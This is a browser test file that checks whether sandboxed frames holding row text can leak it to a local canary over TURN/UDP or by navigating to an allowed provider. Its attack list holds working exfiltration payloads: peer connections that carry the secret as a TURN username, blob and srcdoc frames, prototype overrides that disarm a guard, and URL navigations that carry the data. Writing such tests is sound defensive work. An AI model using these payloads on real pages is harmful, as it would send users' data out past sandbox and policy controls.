/**
 * What a frame cannot send, in a real browser: a drawn component, a visual and an attached page, each holding a row's text,
 * under the app's own `frame-src`, the hosts' own frame document and the document it is really handed, with a canary
 * listening on TCP and UDP.
 *
 * EVERY CASE HERE LEFT THE MACHINE BEFORE IT WAS CLOSED (5 November 2026): the row reached a TURN server as a username, by a
 * `blob:` document with no guard in it and by a `srcdoc` frame kept alive by disarming the guard; an attached page had no
 * guard at all; and a frame went to a provider's address with the row in it, because the page's `frame-src` named it. The
 * first test holds the canary to account: a page with no guard must reach it, or the others prove nothing.
 *
 * Skipped, with a sentence, where there is no browser to open.
 */

import assert from 'node:assert/strict';
import dgram from 'node:dgram';
import { createServer } from 'node:http';
import { createServer as createTcp } from 'node:net';
import { after, before, test } from 'node:test';

import { chromium } from '@playwright/test';

import { DRAWN_FRAME_HTML, drawnFrameHeaders, fileFrameHeaders } from '../../../packages/host/src/drawn-frame.ts';
import { drawnDocument } from '../../../packages/render/src/drawn.ts';
import { attachedDocument, visualDocument } from '../../../packages/render/src/visual.ts';

/* A PATH IN A VARIABLE, so `svelte-check` does not ask for a declaration file for a config written in JavaScript. */
const CONFIG = '../svelte.config.js';

const SECRET = 'SECRET-ROW-TEXT';
const data = { list: null, columns: [], rows: [{ ref: 'tasks#1', fields: { what: SECRET } }] };
const theme = { mode: 'light', tokens: {} };

let browser = null;
let policy = '';
const reached = [];
let udpPort = 0;
let providerPort = 0;
let doc = '';
let framePath = '/drawn-frame';
let origin = '';
const servers = [];

before(async () => {
  browser = await chromium.launch().catch(() => null);
  if (browser === null) return;
  await browser.close();
  const { default: config } = await import(CONFIG);
  const frames = config.kit.csp.directives['frame-src'].map((s) => (s === 'self' ? "'self'" : s)).join(' ');
  policy = `default-src 'self'; script-src 'self'; frame-src ${frames}; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`;
  /* THE CANARY: UDP that keeps the username a TURN client sends after the 401 it answers, and TCP standing in for a provider. */
  const udp = dgram.createSocket('udp4');
  const attr = (type, value) => {
    const pad = Buffer.alloc((4 - (value.length % 4)) % 4);
    const head = Buffer.alloc(4);
    head.writeUInt16BE(type, 0);
    head.writeUInt16BE(value.length, 2);
    return Buffer.concat([head, value, pad]);
  };
  udp.on('message', (m, from) => {
    reached.push(`udp:${m.toString('latin1').includes(SECRET) ? 'the row' : 'a packet'}`);
    if (m.readUInt16BE(0) !== 0x0003 || m.includes(SECRET)) return;
    const body = Buffer.concat([attr(0x0009, Buffer.from([0, 0, 4, 1])), attr(0x0014, Buffer.from('lab')), attr(0x0015, Buffer.from('abcdef'))]);
    const head = Buffer.alloc(20);
    head.writeUInt16BE(0x0113, 0);
    head.writeUInt16BE(body.length, 2);
    m.copy(head, 4, 4, 20);
    udp.send(Buffer.concat([head, body]), from.port, from.address);
  });
  await new Promise((r) => udp.bind(0, '127.0.0.1', r));
  udpPort = udp.address().port;
  const provider = createTcp((c) => {
    reached.push('tcp:a provider');
    c.on('error', () => {});
    c.destroy();
  });
  await new Promise((r) => provider.listen(0, '127.0.0.1', r));
  providerPort = provider.address().port;
  const parent = `const f=document.createElement('iframe');f.setAttribute('sandbox','allow-scripts');f.src=${'`'}${'$'}{new URLSearchParams(location.search).get('f')}${'`'};
    addEventListener('message',async e=>{if(e.source!==f.contentWindow||e.data?.braindog!=='ready'||window.sent)return;window.sent=true;f.contentWindow.postMessage({braindog:'draw',doc:await (await fetch('/doc')).text()},'*')});document.body.append(f);`;
  const app = createServer((q, s) => {
    const path = new URL(q.url, 'http://x').pathname;
    if (path === '/') {
      s.setHeader('content-type', 'text/html');
      s.setHeader('content-security-policy', policy);
      s.end('<!doctype html><title>page</title><body><script src="/page.js"></script>');
    } else if (path === '/page.js') {
      s.setHeader('content-type', 'text/javascript');
      s.end(parent);
    } else if (path === '/doc') {
      s.end(doc);
    } else if (path === '/drawn-frame' || path === '/drawn-frame/file') {
      for (const [k, v] of path.endsWith('file') ? fileFrameHeaders() : drawnFrameHeaders()) s.setHeader(k, v);
      s.end(DRAWN_FRAME_HTML);
    } else {
      s.statusCode = 404;
      s.end();
    }
  });
  await new Promise((r) => app.listen(0, '127.0.0.1', r));
  origin = `http://localhost:${app.address().port}`;
  servers.push(udp, provider, app);
  browser = await chromium.launch({ args: [`--host-resolver-rules=MAP www.google.com 127.0.0.1:${providerPort},MAP www.figma.com 127.0.0.1:${providerPort}`] });
});

after(async () => {
  await browser?.close();
  for (const s of servers) s.close();
});

/** The words a script says to open a peer connection on the TURN server, with the row as its username, built at run time. */
const peer = () =>
  `var S=(self.braindog&&self.braindog.data.rows[0].fields.what)||${JSON.stringify(SECRET)};var pc=new window['RTC'+'PeerConnection']({iceServers:[{urls:'turn:127.0.0.1:${udpPort}?transport=udp',username:S,credential:'x'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});window.__keep=pc;`;
const script = (src) => `<script>${src}</` + 'script>';
const inner = (src) => `'<scr'+'ipt>'+${JSON.stringify(src)}+'</scr'+'ipt>'`;

/* A FUNCTION, so each is written with the canary's port, which is not known until `before` has run. */
const attacks = () => ({
  'a peer connection': peer(),
  'a blob document, with no guard in it': `location=URL.createObjectURL(new Blob([${inner(peer())}],{type:'text/html'}));`,
  'a srcdoc frame': `var f=document.createElement('iframe');f.srcdoc=${inner(peer())};document.body.append(f);`,
  'a srcdoc frame, the guard disarmed through the prototypes': `Element.prototype.remove=function(){};Element.prototype.matches=function(){return false};Element.prototype.querySelectorAll=function(){return []};NodeList.prototype.forEach=function(){};var f=document.createElement('iframe');f.srcdoc=${inner(peer())};document.body.append(f);`,
  'a srcdoc frame, the watch blinded with a getter': `Object.defineProperty(MutationRecord.prototype,'addedNodes',{get:function(){return []}});var f=document.createElement('iframe');f.srcdoc=${inner(peer())};document.body.append(f);`,
  'a provider it navigates itself to': `location='https://www.google.com/s2/favicons?domain='+${JSON.stringify(SECRET)}+'.example.invalid';`,
  'another provider it navigates itself to': `location='https://www.figma.com/?'+${JSON.stringify(SECRET)};`,
});
const KINDS = {
  'a drawn component': { frame: '/drawn-frame', doc: (code) => drawnDocument(code, { data, theme }) },
  'a visual': { frame: '/drawn-frame', doc: (code) => visualDocument(code, {}, theme) },
  'an attached page': { frame: '/drawn-frame/file', doc: (code) => attachedDocument(`<!doctype html><html><body>${code}`) },
};

const drawnIn = async (frame, written) => {
  reached.length = 0;
  doc = written;
  framePath = frame;
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(`${origin}/?f=${encodeURIComponent(framePath)}`);
  await page.waitForTimeout(1500);
  await ctx.close();
  return [...reached];
};

test('THE CANARY HEARS A PAGE WITH NO GUARD, so a silence below means something', { skip: false }, async (t) => {
  if (browser === null) return t.skip('no browser to open');
  const heard = await drawnIn('/drawn-frame/file', `<!doctype html><html><body>${script(peer())}`);
  assert.ok(heard.includes('udp:the row'), `a page with no guard did not reach the canary: ${heard.join(', ') || 'nothing'}`);
});

for (const [kind, { frame, doc: documentOf }] of Object.entries(KINDS)) {
  test(`${kind} sends nothing out`, async (t) => {
    if (browser === null) return t.skip('no browser to open');
    for (const [name, code] of Object.entries(attacks())) {
      const heard = await drawnIn(frame, documentOf(script(code)));
      assert.deepEqual(heard, [], `${kind}, by ${name}, reached the canary`);
    }
  });
}
